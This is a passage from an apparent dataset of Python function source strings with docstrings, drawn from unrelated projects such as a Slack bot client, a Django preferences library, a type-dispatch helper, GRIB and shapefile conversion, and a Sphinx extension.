            "async def from_api_token(cls, token=None, api_cls=SlackBotApi):\n        \"\"\"Create a new instance from the API token.\n\n        Arguments:\n          token (:py:class:`str`, optional): The bot's API token\n            (defaults to ``None``, which means looking in the\n            environment).\n          api_cls (:py:class:`type`, optional): The class to create\n            as the ``api`` argument for API access (defaults to\n            :py:class:`aslack.slack_api.SlackBotApi`).\n\n        Returns:\n          :py:class:`SlackBot`: The new instance.\n\n        \"\"\"\n        api = api_cls.from_env() if token is None else api_cls(api_token=token)\n        data = await api.execute_method(cls.API_AUTH_ENDPOINT)\n        return cls(data['user_id'], data['user'], api)"
        ],
        [
            "def _format_message(self, channel, text):\n        \"\"\"Format an outgoing message for transmission.\n\n        Note:\n          Adds the message type (``'message'``) and incremental ID.\n\n        Arguments:\n          channel (:py:class:`str`): The channel to send to.\n          text (:py:class:`str`): The message text to send.\n\n        Returns:\n          :py:class:`str`: The JSON string of the message.\n\n        \"\"\"\n        payload = {'type': 'message', 'id': next(self._msg_ids)}\n        payload.update(channel=channel, text=text)\n        return json.dumps(payload)"
        ],
        [
            "async def _get_socket_url(self):\n        \"\"\"Get the WebSocket URL for the RTM session.\n\n        Warning:\n          The URL expires if the session is not joined within 30\n          seconds of the API call to the start endpoint.\n\n        Returns:\n          :py:class:`str`: The socket URL.\n\n        \"\"\"\n        data = await self.api.execute_method(\n            self.RTM_START_ENDPOINT,\n            simple_latest=True,\n            no_unreads=True,\n        )\n        return data['url']"
        ],
        [
            "def _instruction_list(self, filters):\n        \"\"\"Generates the instructions for a bot and its filters.\n\n        Note:\n          The guidance for each filter is generated by combining the\n          docstrings of the predicate filter and resulting dispatch\n          function with a single space between. The class's\n          :py:attr:`INSTRUCTIONS` and the default help command are\n          added.\n\n        Arguments:\n          filters (:py:class:`list`): The filters to apply to incoming\n            messages.\n\n        Returns:\n          :py:class:`str`: The bot's instructions.\n\n        \"\"\"\n        return '\\n\\n'.join([\n            self.INSTRUCTIONS.strip(),\n            '*Supported methods:*',\n            'If you send \"@{}: help\" to me I reply with these '\n            'instructions.'.format(self.user),\n            'If you send \"@{}: version\" to me I reply with my current '\n            'version.'.format(self.user),\n        ] + [filter.description() for filter in filters])"
        ],
        [
            "def _respond(self, channel, text):\n        \"\"\"Respond to a message on the current socket.\n\n        Args:\n          channel (:py:class:`str`): The channel to send to.\n          text (:py:class:`str`): The message text to send.\n\n        \"\"\"\n        result = self._format_message(channel, text)\n        if result is not None:\n            logger.info(\n                'Sending message: %r',\n                truncate(result, max_len=50),\n            )\n        self.socket.send_str(result)"
        ],
        [
            "def _validate_first_message(cls, msg):\n        \"\"\"Check the first message matches the expected handshake.\n\n        Note:\n          The handshake is provided as :py:attr:`RTM_HANDSHAKE`.\n\n        Arguments:\n          msg (:py:class:`aiohttp.Message`): The message to validate.\n\n        Raises:\n          :py:class:`SlackApiError`: If the data doesn't match the\n            expected handshake.\n\n        \"\"\"\n        data = cls._unpack_message(msg)\n        logger.debug(data)\n        if data != cls.RTM_HANDSHAKE:\n            raise SlackApiError('Unexpected response: {!r}'.format(data))\n        logger.info('Joined real-time messaging.')"
        ],
        [
            "def get_app_locations():\n    \"\"\"\n    Returns list of paths to tested apps\n    \"\"\"\n    return [os.path.dirname(os.path.normpath(import_module(app_name).__file__))\n            for app_name in PROJECT_APPS]"
        ],
        [
            "def get_tasks():\n    \"\"\"Get the imported task classes for each task that will be run\"\"\"\n    task_classes = []\n    for task_path in TASKS:\n        try:\n            module, classname = task_path.rsplit('.', 1)\n        except ValueError:\n            raise ImproperlyConfigured('%s isn\\'t a task module' % task_path)\n        try:\n            mod = import_module(module)\n        except ImportError as e:\n            raise ImproperlyConfigured('Error importing task %s: \"%s\"'\n                                       % (module, e))\n        try:\n            task_class = getattr(mod, classname)\n        except AttributeError:\n            raise ImproperlyConfigured('Task module \"%s\" does not define a '\n                                       '\"%s\" class' % (module, classname))\n        task_classes.append(task_class)\n    return task_classes"
        ],
        [
            "def get_task_options():\n    \"\"\"Get the options for each task that will be run\"\"\"\n    options = ()\n\n    task_classes = get_tasks()\n    for cls in task_classes:\n        options += cls.option_list\n\n    return options"
        ],
        [
            "def to_cldf(self, dest, mdname='cldf-metadata.json'):\n        \"\"\"\n        Write the data from the db to a CLDF dataset according to the metadata in `self.dataset`.\n\n        :param dest:\n        :param mdname:\n        :return: path of the metadata file\n        \"\"\"\n        dest = Path(dest)\n        if not dest.exists():\n            dest.mkdir()\n\n        data = self.read()\n\n        if data[self.source_table_name]:\n            sources = Sources()\n            for src in data[self.source_table_name]:\n                sources.add(Source(\n                    src['genre'],\n                    src['id'],\n                    **{k: v for k, v in src.items() if k not in ['id', 'genre']}))\n            sources.write(dest / self.dataset.properties.get('dc:source', 'sources.bib'))\n\n        for table_type, items in data.items():\n            try:\n                table = self.dataset[table_type]\n                table.common_props['dc:extent'] = table.write(\n                    [self.retranslate(table, item) for item in items],\n                    base=dest)\n            except KeyError:\n                assert table_type == self.source_table_name, table_type\n        return self.dataset.write_metadata(dest / mdname)"
        ],
        [
            "def description(self):\n        \"\"\"A user-friendly description of the handler.\n\n        Returns:\n          :py:class:`str`: The handler's description.\n\n        \"\"\"\n        if self._description is None:\n            text = '\\n'.join(self.__doc__.splitlines()[1:]).strip()\n            lines = []\n            for line in map(str.strip, text.splitlines()):\n                if line and lines:\n                    lines[-1] = ' '.join((lines[-1], line))\n                elif line:\n                    lines.append(line)\n                else:\n                    lines.append('')\n            self._description = '\\n'.join(lines)\n        return self._description"
        ],
        [
            "def from_jsonfile(cls, fp, selector_handler=None, strict=False, debug=False):\n        \"\"\"\n        Create a Parselet instance from a file containing\n        the Parsley script as a JSON object\n\n        >>> import parslepy\n        >>> with open('parselet.json') as fp:\n        ...     parslepy.Parselet.from_jsonfile(fp)\n        ...\n        <parslepy.base.Parselet object at 0x2014e50>\n\n        :param file fp: an open file-like pointer containing the Parsley script\n        :rtype: :class:`.Parselet`\n\n        Other arguments: same as for :class:`.Parselet` contructor\n        \"\"\"\n\n        return cls._from_jsonlines(fp,\n            selector_handler=selector_handler, strict=strict, debug=debug)"
        ],
        [
            "def from_yamlfile(cls, fp, selector_handler=None, strict=False, debug=False):\n        \"\"\"\n        Create a Parselet instance from a file containing\n        the Parsley script as a YAML object\n\n        >>> import parslepy\n        >>> with open('parselet.yml') as fp:\n        ...     parslepy.Parselet.from_yamlfile(fp)\n        ...\n        <parslepy.base.Parselet object at 0x2014e50>\n\n        :param file fp: an open file-like pointer containing the Parsley script\n        :rtype: :class:`.Parselet`\n\n        Other arguments: same as for :class:`.Parselet` contructor\n        \"\"\"\n\n        return cls.from_yamlstring(fp.read(), selector_handler=selector_handler, strict=strict, debug=debug)"
        ],
        [
            "def _from_jsonlines(cls, lines, selector_handler=None, strict=False, debug=False):\n        \"\"\"\n        Interpret input lines as a JSON Parsley script.\n        Python-style comment lines are skipped.\n        \"\"\"\n\n        return cls(json.loads(\n                \"\\n\".join([l for l in lines if not cls.REGEX_COMMENT_LINE.match(l)])\n            ), selector_handler=selector_handler, strict=strict, debug=debug)"
        ],
        [
            "def _compile(self, parselet_node, level=0):\n        \"\"\"\n        Build part of the abstract Parsley extraction tree\n\n        Arguments:\n        parselet_node (dict) -- part of the Parsley tree to compile\n                                (can be the root dict/node)\n        level (int)          -- current recursion depth (used for debug)\n        \"\"\"\n\n        if self.DEBUG:\n            debug_offset = \"\".join([\"    \" for x in range(level)])\n\n        if self.DEBUG:\n            print(debug_offset, \"%s::compile(%s)\" % (\n                self.__class__.__name__, parselet_node))\n\n        if isinstance(parselet_node, dict):\n            parselet_tree = ParsleyNode()\n            for k, v in list(parselet_node.items()):\n\n                # we parse the key raw elements but without much\n                # interpretation (which is done by the SelectorHandler)\n                try:\n                    m = self.REGEX_PARSELET_KEY.match(k)\n                    if not m:\n                        if self.DEBUG:\n                            print(debug_offset, \"could not parse key\", k)\n                        raise InvalidKeySyntax(k)\n                except:\n                    raise InvalidKeySyntax(\"Key %s is not valid\" % k)\n\n                key = m.group('key')\n                # by default, fields are required\n                key_required = True\n                operator = m.group('operator')\n                if operator == '?':\n                    key_required = False\n                # FIXME: \"!\" operator not supported (complete array)\n                scope = m.group('scope')\n\n                # example: get list of H3 tags\n                # { \"titles\": [\"h3\"] }\n                # FIXME: should we support multiple selectors in list?\n                #        e.g. { \"titles\": [\"h1\", \"h2\", \"h3\", \"h4\"] }\n                if isinstance(v, (list, tuple)):\n                    v = v[0]\n                    iterate = True\n                else:\n                    iterate = False\n\n                # keys in the abstract Parsley trees are of type `ParsleyContext`\n                try:\n                    parsley_context = ParsleyContext(\n                        key,\n                        operator=operator,\n                        required=key_required,\n                        scope=self.selector_handler.make(scope) if scope else None,\n                        iterate=iterate)\n                except SyntaxError:\n                    if self.DEBUG:\n                        print(\"Invalid scope:\", k, scope)\n                    raise\n\n                if self.DEBUG:\n                    print(debug_offset, \"current context:\", parsley_context)\n\n                # go deeper in the Parsley tree...\n                try:\n                    child_tree = self._compile(v, level=level+1)\n                except SyntaxError:\n                    if self.DEBUG:\n                        print(\"Invalid value: \", v)\n                    raise\n                except:\n                    raise\n\n                if self.DEBUG:\n                    print(debug_offset, \"child tree:\", child_tree)\n\n                parselet_tree[parsley_context] = child_tree\n\n            return parselet_tree\n\n        # a string leaf should match some kind of selector,\n        # let the selector handler deal with it\n        elif isstr(parselet_node):\n            return self.selector_handler.make(parselet_node)\n        else:\n            raise ValueError(\n                    \"Unsupported type(%s) for Parselet node <%s>\" % (\n                        type(parselet_node), parselet_node))"
        ],
        [
            "def auto_constraints(self, component=None):\n        \"\"\"\n        Use CLDF reference properties to implicitely create foreign key constraints.\n\n        :param component: A Table object or `None`.\n        \"\"\"\n        if not component:\n            for table in self.tables:\n                self.auto_constraints(table)\n            return\n\n        if not component.tableSchema.primaryKey:\n            idcol = component.get_column(term_uri('id'))\n            if idcol:\n                component.tableSchema.primaryKey = [idcol.name]\n\n        self._auto_foreign_keys(component)\n\n        try:\n            table_type = self.get_tabletype(component)\n        except ValueError:\n            # New component is not a known CLDF term, so cannot add components\n            # automatically. TODO: We might me able to infer some based on\n            # `xxxReference` column properties?\n            return\n\n        # auto-add foreign keys targetting the new component:\n        for table in self.tables:\n            self._auto_foreign_keys(table, component=component, table_type=table_type)"
        ],
        [
            "def url_builder(self, endpoint, *, root=None, params=None, url_params=None):\n        \"\"\"Create a URL for the specified endpoint.\n\n        Arguments:\n          endpoint (:py:class:`str`): The API endpoint to access.\n          root: (:py:class:`str`, optional): The root URL for the\n            service API.\n          params: (:py:class:`dict`, optional): The values for format\n            into the created URL (defaults to ``None``).\n          url_params: (:py:class:`dict`, optional): Parameters to add\n            to the end of the URL (defaults to ``None``).\n\n        Returns:\n          :py:class:`str`: The resulting URL.\n\n        \"\"\"\n        if root is None:\n            root = self.ROOT\n        scheme, netloc, path, _, _ = urlsplit(root)\n        return urlunsplit((\n            scheme,\n            netloc,\n            urljoin(path, endpoint),\n            urlencode(url_params or {}),\n            '',\n        )).format(**params or {})"
        ],
        [
            "def raise_for_status(response):\n    \"\"\"Raise an appropriate error for a given response.\n\n    Arguments:\n      response (:py:class:`aiohttp.ClientResponse`): The API response.\n\n    Raises:\n      :py:class:`aiohttp.web_exceptions.HTTPException`: The appropriate\n        error for the response's status.\n\n    \"\"\"\n    for err_name in web_exceptions.__all__:\n        err = getattr(web_exceptions, err_name)\n        if err.status_code == response.status:\n            payload = dict(\n                headers=response.headers,\n                reason=response.reason,\n            )\n            if issubclass(err, web_exceptions._HTTPMove):  # pylint: disable=protected-access\n                raise err(response.headers['Location'], **payload)\n            raise err(**payload)"
        ],
        [
            "def truncate(text, max_len=350, end='...'):\n    \"\"\"Truncate the supplied text for display.\n\n    Arguments:\n      text (:py:class:`str`): The text to truncate.\n      max_len (:py:class:`int`, optional): The maximum length of the\n        text before truncation (defaults to 350 characters).\n      end (:py:class:`str`, optional): The ending to use to show that\n        the text was truncated (defaults to ``'...'``).\n\n    Returns:\n      :py:class:`str`: The truncated text.\n\n    \"\"\"\n    if len(text) <= max_len:\n        return text\n    return text[:max_len].rsplit(' ', maxsplit=1)[0] + end"
        ],
        [
            "def add(self, *entries):\n        \"\"\"\n        Add a source, either specified by glottolog reference id, or as bibtex record.\n        \"\"\"\n        for entry in entries:\n            if isinstance(entry, string_types):\n                self._add_entries(database.parse_string(entry, bib_format='bibtex'))\n            else:\n                self._add_entries(entry)"
        ],
        [
            "def get_cache_key(user_or_username, size, prefix):\n    \"\"\"\n    Returns a cache key consisten of a username and image size.\n    \"\"\"\n    if isinstance(user_or_username, get_user_model()):\n        user_or_username = user_or_username.username\n    return '%s_%s_%s' % (prefix, user_or_username, size)"
        ],
        [
            "def cache_result(func):\n    \"\"\"\n    Decorator to cache the result of functions that take a ``user`` and a\n    ``size`` value.\n    \"\"\"\n    def cache_set(key, value):\n        cache.set(key, value, AVATAR_CACHE_TIMEOUT)\n        return value\n\n    def cached_func(user, size):\n        prefix = func.__name__\n        cached_funcs.add(prefix)\n        key = get_cache_key(user, size, prefix=prefix)\n        return cache.get(key) or cache_set(key, func(user, size))\n    return cached_func"
        ],
        [
            "def invalidate_cache(user, size=None):\n    \"\"\"\n    Function to be called when saving or changing an user's avatars.\n    \"\"\"\n    sizes = set(AUTO_GENERATE_AVATAR_SIZES)\n    if size is not None:\n        sizes.add(size)\n    for prefix in cached_funcs:\n        for size in sizes:\n            cache.delete(get_cache_key(user, size, prefix))"
        ],
        [
            "def get_field_for_proxy(pref_proxy):\n    \"\"\"Returns a field object instance for a given PrefProxy object.\n\n    :param PrefProxy pref_proxy:\n\n    :rtype: models.Field\n\n    \"\"\"\n    field = {\n        bool: models.BooleanField,\n        int:  models.IntegerField,\n        float: models.FloatField,\n        datetime: models.DateTimeField,\n\n    }.get(type(pref_proxy.default), models.TextField)()\n\n    update_field_from_proxy(field, pref_proxy)\n\n    return field"
        ],
        [
            "def update_field_from_proxy(field_obj, pref_proxy):\n    \"\"\"Updates field object with data from a PrefProxy object.\n\n    :param models.Field field_obj:\n\n    :param PrefProxy pref_proxy:\n\n    \"\"\"\n    attr_names = ('verbose_name', 'help_text', 'default')\n\n    for attr_name in attr_names:\n        setattr(field_obj, attr_name, getattr(pref_proxy, attr_name))"
        ],
        [
            "def get_pref_model_class(app, prefs, get_prefs_func):\n    \"\"\"Returns preferences model class dynamically crated for a given app or None on conflict.\"\"\"\n\n    module = '%s.%s' % (app, PREFS_MODULE_NAME)\n\n    model_dict = {\n            '_prefs_app': app,\n            '_get_prefs': staticmethod(get_prefs_func),\n            '__module__': module,\n            'Meta': type('Meta', (models.options.Options,), {\n                'verbose_name': _('Preference'),\n                'verbose_name_plural': _('Preferences'),\n                'app_label': app,\n                'managed': False,\n            })\n    }\n\n    for field_name, val_proxy in prefs.items():\n        model_dict[field_name] = val_proxy.field\n\n    model = type('Preferences', (models.Model,), model_dict)\n\n    def fake_save_base(self, *args, **kwargs):\n\n        updated_prefs = {\n            f.name: getattr(self, f.name) for f in self._meta.fields if not isinstance(f, models.fields.AutoField)\n        }\n\n        app_prefs = self._get_prefs(self._prefs_app)\n\n        for pref in app_prefs.keys():\n            if pref in updated_prefs:\n                app_prefs[pref].db_value = updated_prefs[pref]\n\n        self.pk = self._prefs_app  # Make Django 1.7 happy.\n        prefs_save.send(sender=self, app=self._prefs_app, updated_prefs=updated_prefs)\n\n        return True\n\n    model.save_base = fake_save_base\n\n    return model"
        ],
        [
            "def get_frame_locals(stepback=0):\n    \"\"\"Returns locals dictionary from a given frame.\n\n    :param int stepback:\n\n    :rtype: dict\n\n    \"\"\"\n    with Frame(stepback=stepback) as frame:\n        locals_dict = frame.f_locals\n\n    return locals_dict"
        ],
        [
            "def traverse_local_prefs(stepback=0):\n    \"\"\"Generator to walk through variables considered as preferences\n    in locals dict of a given frame.\n\n    :param int stepback:\n\n    :rtype: tuple\n\n    \"\"\"\n    locals_dict = get_frame_locals(stepback+1)\n    for k in locals_dict:\n        if not k.startswith('_') and k.upper() == k:\n            yield k, locals_dict"
        ],
        [
            "def print_file_info():\n    \"\"\"Prints file details in the current directory\"\"\"\n    tpl = TableLogger(columns='file,created,modified,size')\n    for f in os.listdir('.'):\n        size = os.stat(f).st_size\n        date_created = datetime.fromtimestamp(os.path.getctime(f))\n        date_modified = datetime.fromtimestamp(os.path.getmtime(f))\n        tpl(f, date_created, date_modified, size)"
        ],
        [
            "def _bind_args(sig, param_matchers, args, kwargs):\n        '''\n        Attempt to bind the args to the type signature. First try to just bind\n        to the signature, then ensure that all arguments match the parameter\n        types.\n        '''\n        #Bind to signature. May throw its own TypeError\n        bound = sig.bind(*args, **kwargs)\n\n        if not all(param_matcher(bound.arguments[param_name])\n                for param_name, param_matcher in param_matchers):\n            raise TypeError\n\n        return bound"
        ],
        [
            "def _make_all_matchers(cls, parameters):\n        '''\n        For every parameter, create a matcher if the parameter has an\n        annotation.\n        '''\n        for name, param in parameters:\n            annotation = param.annotation\n            if annotation is not Parameter.empty:\n                yield name, cls._make_param_matcher(annotation, param.kind)"
        ],
        [
            "def _make_wrapper(self, func):\n        '''\n        Makes a wrapper function that executes a dispatch call for func. The\n        wrapper has the dispatch and dispatch_first attributes, so that\n        additional overloads can be added to the group.\n        '''\n\n        #TODO: consider using a class to make attribute forwarding easier.\n        #TODO: consider using simply another DispatchGroup, with self.callees\n        # assigned by reference to the original callees.\n        @wraps(func)\n        def executor(*args, **kwargs):\n            return self.execute(args, kwargs)\n        executor.dispatch = self.dispatch\n        executor.dispatch_first = self.dispatch_first\n        executor.func = func\n        executor.lookup = self.lookup\n        return executor"
        ],
        [
            "def dispatch(self, func):\n        '''\n        Adds the decorated function to this dispatch.\n        '''\n        self.callees.append(self._make_dispatch(func))\n        return self._make_wrapper(func)"
        ],
        [
            "def dispatch_first(self, func):\n        '''\n        Adds the decorated function to this dispatch, at the FRONT of the order.\n        Useful for allowing third parties to add overloaded functionality\n        to be executed before default functionality.\n        '''\n        self.callees.appendleft(self._make_dispatch(func))\n        return self._make_wrapper(func)"
        ],
        [
            "def execute(self, args, kwargs):\n        '''\n        Dispatch a call. Call the first function whose type signature matches\n        the arguemts.\n        '''\n        return self.lookup_explicit(args, kwargs)(*args, **kwargs)"
        ],
        [
            "def convertShpToExtend(pathToShp):\n    \"\"\"\n    reprojette en WGS84 et recupere l'extend\n    \"\"\" \n    \n    driver = ogr.GetDriverByName('ESRI Shapefile')\n    dataset = driver.Open(pathToShp)\n    if dataset is not None:\n        # from Layer\n        layer = dataset.GetLayer()\n        spatialRef = layer.GetSpatialRef()\n        # from Geometry\n        feature = layer.GetNextFeature()\n        geom = feature.GetGeometryRef()\n        spatialRef = geom.GetSpatialReference()\n        \n        #WGS84\n        outSpatialRef = osr.SpatialReference()\n        outSpatialRef.ImportFromEPSG(4326)\n\n        coordTrans = osr.CoordinateTransformation(spatialRef, outSpatialRef)\n\n        env = geom.GetEnvelope()\n\n        pointMAX = ogr.Geometry(ogr.wkbPoint)\n        pointMAX.AddPoint(env[1], env[3])\n        pointMAX.Transform(coordTrans)\n        \n        pointMIN = ogr.Geometry(ogr.wkbPoint)\n        pointMIN.AddPoint(env[0], env[2])\n        pointMIN.Transform(coordTrans)\n\n\n        return [pointMAX.GetPoint()[1],pointMIN.GetPoint()[0],pointMIN.GetPoint()[1],pointMAX.GetPoint()[0]]\n    else:\n        exit(\" shapefile not found. Please verify your path to the shapefile\")"
        ],
        [
            "def convertGribToTiff(listeFile,listParam,listLevel,liststep,grid,startDate,endDate,outFolder):\n    \"\"\" Convert GRIB to Tif\"\"\"\n    \n    dicoValues={}\n    \n    for l in listeFile:\n        grbs = pygrib.open(l)\n        grbs.seek(0)\n        index=1\n        for j in range(len(listLevel),0,-1):\n            for i in range(len(listParam)-1,-1,-1):\n                grb = grbs[index]\n                p=grb.name.replace(' ','_')\n                if grb.level != 0:\n                    l=str(grb.level)+'_'+grb.typeOfLevel\n                else:\n                    l=grb.typeOfLevel\n                if p+'_'+l not in dicoValues.keys():\n                    dicoValues[p+'_'+l]=[]\n                dicoValues[p+'_'+l].append(grb.values)\n                shape=grb.values.shape\n                lat,lon=grb.latlons()\n                geoparam=(lon.min(),lat.max(),grid,grid)\n                index+= 1\n\n    nbJour=(endDate-startDate).days+1\n    #on joute des arrayNan si il manque des fichiers\n    for s in range(0, (len(liststep)*nbJour-len(listeFile))):\n        for k in dicoValues.keys():\n            dicoValues[k].append(np.full(shape, np.nan))\n\n    #On \u00e9crit pour chacune des variables dans un fichier\n    for i in range(len(dicoValues.keys())-1,-1,-1):\n        dictParam=dict((k,dicoValues[dicoValues.keys()[i]][k]) for k in range(0,len(dicoValues[dicoValues.keys()[i]])))\n        sorted(dictParam.items(), key=lambda x: x[0])\n        outputImg=outFolder+'/'+dicoValues.keys()[i]+'_'+startDate.strftime('%Y%M%d')+'_'+endDate.strftime('%Y%M%d')+'.tif'\n        writeTiffFromDicoArray(dictParam,outputImg,shape,geoparam)\n    \n    for f in listeFile:\n        os.remove(f)"
        ],
        [
            "def on_pref_update(*args, **kwargs):\n    \"\"\"Triggered on dynamic preferences model save.\n     Issues DB save and reread.\n\n    \"\"\"\n    Preference.update_prefs(*args, **kwargs)\n    Preference.read_prefs(get_prefs())"
        ],
        [
            "def bind_proxy(values, category=None, field=None, verbose_name=None, help_text='', static=True, readonly=False):\n    \"\"\"Binds PrefProxy objects to module variables used by apps as preferences.\n\n    :param list|tuple values: Preference values.\n\n    :param str|unicode category: Category name the preference belongs to.\n\n    :param Field field: Django model field to represent this preference.\n\n    :param str|unicode verbose_name: Field verbose name.\n\n    :param str|unicode help_text: Field help text.\n\n    :param bool static: Leave this preference static (do not store in DB).\n\n    :param bool readonly: Make this field read only.\n\n    :rtype: list\n\n    \"\"\"\n    addrs = OrderedDict()\n\n    depth = 3\n\n    for local_name, locals_dict in traverse_local_prefs(depth):\n        addrs[id(locals_dict[local_name])] = local_name\n\n    proxies = []\n    locals_dict = get_frame_locals(depth)\n\n    for value in values:  # Try to preserve fields order.\n\n        id_val = id(value)\n\n        if id_val in addrs:\n            local_name = addrs[id_val]\n            local_val = locals_dict[local_name]\n\n            if isinstance(local_val, PatchedLocal) and not isinstance(local_val, PrefProxy):\n\n                proxy = PrefProxy(\n                    local_name, value.val,\n                    category=category,\n                    field=field,\n                    verbose_name=verbose_name,\n                    help_text=help_text,\n                    static=static,\n                    readonly=readonly,\n                )\n\n                app_name = locals_dict['__name__'].split('.')[-2]  # x.y.settings -> y\n                prefs = get_prefs()\n\n                if app_name not in prefs:\n                    prefs[app_name] = OrderedDict()\n\n                prefs[app_name][local_name.lower()] = proxy\n\n                # Replace original pref variable with a proxy.\n                locals_dict[local_name] = proxy\n                proxies.append(proxy)\n\n    return proxies"
        ],
        [
            "def register_admin_models(admin_site):\n    \"\"\"Registers dynamically created preferences models for Admin interface.\n\n    :param admin.AdminSite admin_site: AdminSite object.\n\n    \"\"\"\n    global __MODELS_REGISTRY\n\n    prefs = get_prefs()\n\n    for app_label, prefs_items in prefs.items():\n\n        model_class = get_pref_model_class(app_label, prefs_items, get_app_prefs)\n\n        if model_class is not None:\n            __MODELS_REGISTRY[app_label] = model_class\n            admin_site.register(model_class, get_pref_model_admin_class(prefs_items))"
        ],
        [
            "def autodiscover_siteprefs(admin_site=None):\n    \"\"\"Automatically discovers and registers all preferences available in all apps.\n\n    :param admin.AdminSite admin_site: Custom AdminSite object.\n\n    \"\"\"\n    if admin_site is None:\n        admin_site = admin.site\n\n    # Do not discover anything if called from manage.py (e.g. executing commands from cli).\n    if 'manage' not in sys.argv[0] or (len(sys.argv) > 1 and sys.argv[1] in MANAGE_SAFE_COMMANDS):\n        import_prefs()\n        Preference.read_prefs(get_prefs())\n        register_admin_models(admin_site)"
        ],
        [
            "def unpatch_locals(depth=3):\n    \"\"\"Restores the original values of module variables\n    considered preferences if they are still PatchedLocal\n    and not PrefProxy.\n\n    \"\"\"\n    for name, locals_dict in traverse_local_prefs(depth):\n        if isinstance(locals_dict[name], PatchedLocal):\n            locals_dict[name] = locals_dict[name].val\n\n    del get_frame_locals(depth)[__PATCHED_LOCALS_SENTINEL]"
        ],
        [
            "def proxy_settings_module(depth=3):\n    \"\"\"Replaces a settings module with a Module proxy to intercept\n    an access to settings.\n\n    :param int depth: Frame count to go backward.\n\n    \"\"\"\n    proxies = []\n\n    modules = sys.modules\n    module_name = get_frame_locals(depth)['__name__']\n\n    module_real = modules[module_name]\n\n    for name, locals_dict in traverse_local_prefs(depth):\n\n        value = locals_dict[name]\n\n        if isinstance(value, PrefProxy):\n            proxies.append(name)\n\n    new_module = type(module_name, (ModuleType, ModuleProxy), {})(module_name)  # ModuleProxy\n    new_module.bind(module_real, proxies)\n\n    modules[module_name] = new_module"
        ],
        [
            "def register_prefs(*args, **kwargs):\n    \"\"\"Registers preferences that should be handled by siteprefs.\n\n    Expects preferences as *args.\n\n    Use keyword arguments to batch apply params supported by\n    ``PrefProxy`` to all preferences not constructed by ``pref`` and ``pref_group``.\n\n    Batch kwargs:\n\n        :param str|unicode help_text: Field help text.\n\n        :param bool static: Leave this preference static (do not store in DB).\n\n        :param bool readonly: Make this field read only.\n\n    :param bool swap_settings_module: Whether to automatically replace settings module\n        with a special ``ProxyModule`` object to access dynamic values of settings\n        transparently (so not to bother with calling ``.value`` of ``PrefProxy`` object).\n\n    \"\"\"\n    swap_settings_module = bool(kwargs.get('swap_settings_module', True))\n\n    if __PATCHED_LOCALS_SENTINEL not in get_frame_locals(2):\n        raise SitePrefsException('Please call `patch_locals()` right before the `register_prefs()`.')\n\n    bind_proxy(args, **kwargs)\n\n    unpatch_locals()\n\n    swap_settings_module and proxy_settings_module()"
        ],
        [
            "def pref_group(title, prefs, help_text='', static=True, readonly=False):\n    \"\"\"Marks preferences group.\n\n    :param str|unicode title: Group title\n\n    :param list|tuple prefs: Preferences to group.\n\n    :param str|unicode help_text: Field help text.\n\n    :param bool static: Leave this preference static (do not store in DB).\n\n    :param bool readonly: Make this field read only.\n\n    \"\"\"\n    bind_proxy(prefs, title, help_text=help_text, static=static, readonly=readonly)\n\n    for proxy in prefs:  # For preferences already marked by pref().\n        if isinstance(proxy, PrefProxy):\n            proxy.category = title"
        ],
        [
            "def pref(preference, field=None, verbose_name=None, help_text='', static=True, readonly=False):\n    \"\"\"Marks a preference.\n\n    :param preference: Preference variable.\n\n    :param Field field: Django model field to represent this preference.\n\n    :param str|unicode verbose_name: Field verbose name.\n\n    :param str|unicode help_text: Field help text.\n\n    :param bool static: Leave this preference static (do not store in DB).\n\n    :param bool readonly: Make this field read only.\n\n    :rtype: PrefProxy|None\n    \"\"\"\n    try:\n        bound = bind_proxy(\n            (preference,),\n            field=field,\n            verbose_name=verbose_name,\n            help_text=help_text,\n            static=static,\n            readonly=readonly,\n        )\n        return bound[0]\n\n    except IndexError:\n        return"
        ],
        [
            "def generate_versionwarning_data_json(app, config=None, **kwargs):\n    \"\"\"\n    Generate the ``versionwarning-data.json`` file.\n\n    This file is included in the output and read by the AJAX request when\n    accessing to the documentation and used to compare the live versions with\n    the curent one.\n\n    Besides, this file contains meta data about the project, the API to use and\n    the banner itself.\n    \"\"\"\n\n    # In Sphinx >= 1.8 we use ``config-initied`` signal which comes with the\n    # ``config`` object and in Sphinx < 1.8 we use ``builder-initied`` signal\n    # that doesn't have the ``config`` object and we take it from the ``app``\n    config = config or kwargs.pop('config', None)\n    if config is None:\n        config = app.config\n\n    if config.versionwarning_project_version in config.versionwarning_messages:\n        custom = True\n        message = config.versionwarning_messages.get(config.versionwarning_project_version)\n    else:\n        custom = False\n        message = config.versionwarning_default_message\n\n    banner_html = config.versionwarning_banner_html.format(\n        id_div=config.versionwarning_banner_id_div,\n        banner_title=config.versionwarning_banner_title,\n        message=message.format(\n            **{config.versionwarning_message_placeholder: '<a href=\"#\"></a>'},\n        ),\n        admonition_type=config.versionwarning_admonition_type,\n    )\n\n    data = json.dumps({\n        'meta': {\n            'api_url': config.versionwarning_api_url,\n        },\n        'banner': {\n            'html': banner_html,\n            'id_div': config.versionwarning_banner_id_div,\n            'body_selector': config.versionwarning_body_selector,\n            'custom': custom,\n        },\n        'project': {\n            'slug': config.versionwarning_project_slug,\n        },\n        'version': {\n            'slug': config.versionwarning_project_version,\n        },\n    }, indent=4)\n\n    data_path = os.path.join(STATIC_PATH, 'data')\n    if not os.path.exists(data_path):\n        os.mkdir(data_path)\n\n    with open(os.path.join(data_path, JSON_DATA_FILENAME), 'w') as f:\n        f.write(data)\n\n    # Add the path where ``versionwarning-data.json`` file and\n    # ``versionwarning.js`` are saved\n    config.html_static_path.append(STATIC_PATH)"
        ],
        [
            "def objective(param_scales=(1, 1), xstar=None, seed=None):\n    \"\"\"Gives objective functions a number of dimensions and parameter range\n\n    Parameters\n    ----------\n    param_scales : (int, int)\n        Scale (std. dev.) for choosing each parameter\n\n    xstar : array_like\n        Optimal parameters\n    \"\"\"\n    ndim = len(param_scales)\n\n    def decorator(func):\n\n        @wraps(func)\n        def wrapper(theta):\n            return func(theta)\n\n        def param_init():\n            np.random.seed(seed)\n            return np.random.randn(ndim,) * np.array(param_scales)\n\n        wrapper.ndim = ndim\n        wrapper.param_init = param_init\n        wrapper.xstar = xstar\n\n        return wrapper\n\n    return decorator"
        ],
        [
            "def doublewell(theta):\n    \"\"\"Pointwise minimum of two quadratic bowls\"\"\"\n    k0, k1, depth = 0.01, 100, 0.5\n    shallow = 0.5 * k0 * theta ** 2 + depth\n    deep = 0.5 * k1 * theta ** 2\n    obj = float(np.minimum(shallow, deep))\n    grad = np.where(deep < shallow, k1 * theta, k0 * theta)\n    return obj, grad"
        ],
        [
